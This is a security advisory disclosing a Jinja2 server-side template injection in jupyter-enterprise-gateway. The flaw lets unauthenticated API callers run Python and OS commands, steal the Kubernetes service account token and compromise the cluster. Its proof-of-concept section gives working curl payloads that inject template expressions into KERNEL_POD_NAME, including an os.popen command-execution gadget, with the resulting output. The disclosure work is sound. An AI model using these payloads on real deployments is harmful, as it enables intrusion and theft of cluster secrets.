# Jinja2 Template Server Side Template Injection resulting in Remote Code Execution

* GHSA-f49j-v924-fx9w
* CVE-2026-44181
* CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H
* CWE-1336
* **Affected**: [`jupyter-enterprise-gateway`](https://pypi.org/project/jupyter-enterprise-gateway/) `>= 2.0.0rc2, < 3.3.0`
* **Fixed in**: `3.3.0`
* **PURL**: `pkg:pypi/jupyter-enterprise-gateway`

### Summary
_Short summary of the problem. Make the impact and severity as clear as possible. For example: An unsafe deserialization vulnerability allows any unauthenticated user to execute arbitrary code on the server._

The environment variables (`KERNEL_XXX`) used during the rendering of the Kubernetes manifest are vulnerable to Server Side Template Injection (SSTI).
By including Jinja2 template expressions it is possible to execution Python code and OS Commands in the Enterprise Gateway service.
The code can use or steal the Kubernetes service account token, which can steal Kubernetes secrets and be used to fully compromise the Kubernetes cluster by scheduling a privileged pod or a pod with a `hostPath` volume mount.

### Details
_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._

The `KERNEL_POD_NAME` variable is rendered using Jinja2, allowing for code execution via template expression statements, in this code:
https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/enterprise_gateway/services/processproxies/k8s.py#L219-L247

The Jinja2 template for the Kubernetes manifest contains several `kernel_xxx` variables, in addition to `kernel_pod_name` discussed above, such as `kernel_working_dir` that are used when rendering the manifest and are all vectors for SSTI.
https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/etc/kernel-launchers/kubernetes/scripts/kernel-pod.yaml.j2#L77

These values come from the environment passed in the API call, where they were `KERNEL_XXX` before being converted to lowercase.

https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/etc/kernel-launchers/kubernetes/scripts/launch_kubernetes.py#L130-L137

### PoC
_Complete instructions, including specific configuration details, to reproduce the vulnerability._


#### Simple demonstration of SSTI using `{{7 * 7}}`

```bash
curl http://enterprise-gateway.bdawg.svc.cluster.local:8888/api/kernels --data '{"name":"python_kubernetes", "env": {"KERNEL_POD_NAME": "bdawg-{{7 * 7}}" }}'
```

```json
{"id": "1094076f-35c6-48a5-ae60-0c943bb97a9a", "name": "python_kubernetes", "last_activity": "2025-07-17T07:14:42.155736Z", "execution_state": "starting", "connections": 0}
```

Running `kubectl get pods`
```
NAME                                                 READY   STATUS    RESTARTS   AGE
bdawg-49                                             1/1     Running   0          3m54s
```

#### Remote code execution - OS Commands via SSTI

```bash
curl http://enterprise-gateway.notebooks.svc.cluster.local:8888/api/kernels --data '{"name":"python_kubernetes", "env": {"KERNEL_POD_NAME": "bdawg-{{ cycler.__init__.__globals__.os.popen(\"hostname\").read() }}", "KERNEL_NAMESPACE": "notebooks" }}'
```

```json
{"id": "85ec9431-d005-48d5-8127-5f022f2c5780", "name": "python_kubernetes", "last_activity": "2025-07-17T07
```

```
NAME                                                 READY   STATUS    RESTARTS   AGE
bdawg-enterprise-gateway-8695685bc8-klm4m            1/1     Running   0          2m25s
```

`enterprise-gateway-8695685bc8-klm4m` is the hostname of the Enterprise Gateway pod.


#### Enterprise Gateway RBAC
The Enterprise Gateway service account has R/W access to several resource kinds.

Stolen Enterprise Gateway service account `kubectl auth can-i --list`

```
Resources                                                Non-Resource URLs                      Resource Names   Verbs
selfsubjectreviews.authentication.k8s.io                 []                                     []               [create]
selfsubjectaccessreviews.authorization.k8s.io            []                                     []               [create]
selfsubjectrulesreviews.authorization.k8s.io             []                                     []               [create]
rolebindings.rbac.authorization.k8s.io                   []                                     []               [get list create delete]
configmaps                                               []                                     []               [get watch list create delete]
namespaces                                               []                                     []               [get watch list create delete]
persistentvolumeclaims                                   []                                     []               [get watch list create delete]
persistentvolumes                                        []                                     []               [get watch list create delete]
pods                                                     []                                     []               [get watch list create delete]
secrets                                                  []                                     []               [get watch list create delete]
services                                                 []                                     []               [get watch list create delete]
scheduledsparkapplications.sparkoperator.k8s.io/status   []                                     []               [get watch list create delete]
scheduledsparkapplications.sparkoperator.k8s.io          []                                     []               [get watch list create delete]
sparkapplications.sparkoperator.k8s.io/status            []                                     []               [get watch list create delete]
sparkapplications.sparkoperator.k8s.io                   []                                     []               [get watch list create delete]
                                                         [/.well-known/openid-configuration/]   []               [get]
                                                         [/.well-known/openid-configuration]    []               [get]
                                                         [/api/*]                               []               [get]
                                                         [/api]                                 []               [get]
                                                         [/apis/*]                              []               [get]
                                                         [/apis]                                []               [get]
                                                         [/healthz]                             []               [get]
                                                         [/healthz]                             []               [get]
                                                         [/livez]                               []               [get]
                                                         [/livez]                               []               [get]
                                                         [/openapi/*]                           []               [get]
                                                         [/openapi]                             []               [get]
                                                         [/openid/v1/jwks/]                     []               [get]
                                                         [/openid/v1/jwks]                      []               [get]
                                                         [/readyz]                              []               [get]
                                                         [/readyz]                              []               [get]
                                                         [/version/]                            []               [get]
                                                         [/version/]                            []               [get]
                                                         [/version]                             []               [get]
                                                         [/version]                             []               [get]
```

A [Nuclei](https://github.com/projectdiscovery/nuclei) template for automated detection is available: [`nuclei/jupyter-enterprise-gateway-ssti.yaml`](nuclei/jupyter-enterprise-gateway-ssti.yaml).

### Impact
_What kind of vulnerability is it? Who is impacted?_

This is a server side template injection that leads to remote code execution (python and OS commands).

An attacker can get remote code execution in the Enterprise Gateway pod and steal its Kubernetes service account's token.
It can use the privileges to spy on and interfere with other Jupyter kernel, read, write, or delete configuration maps, read secrets, access persistent storage, privileged pods, or create pods with `hostPath` mounts, which can be used to compromise the complete cluster and all workloads on it.
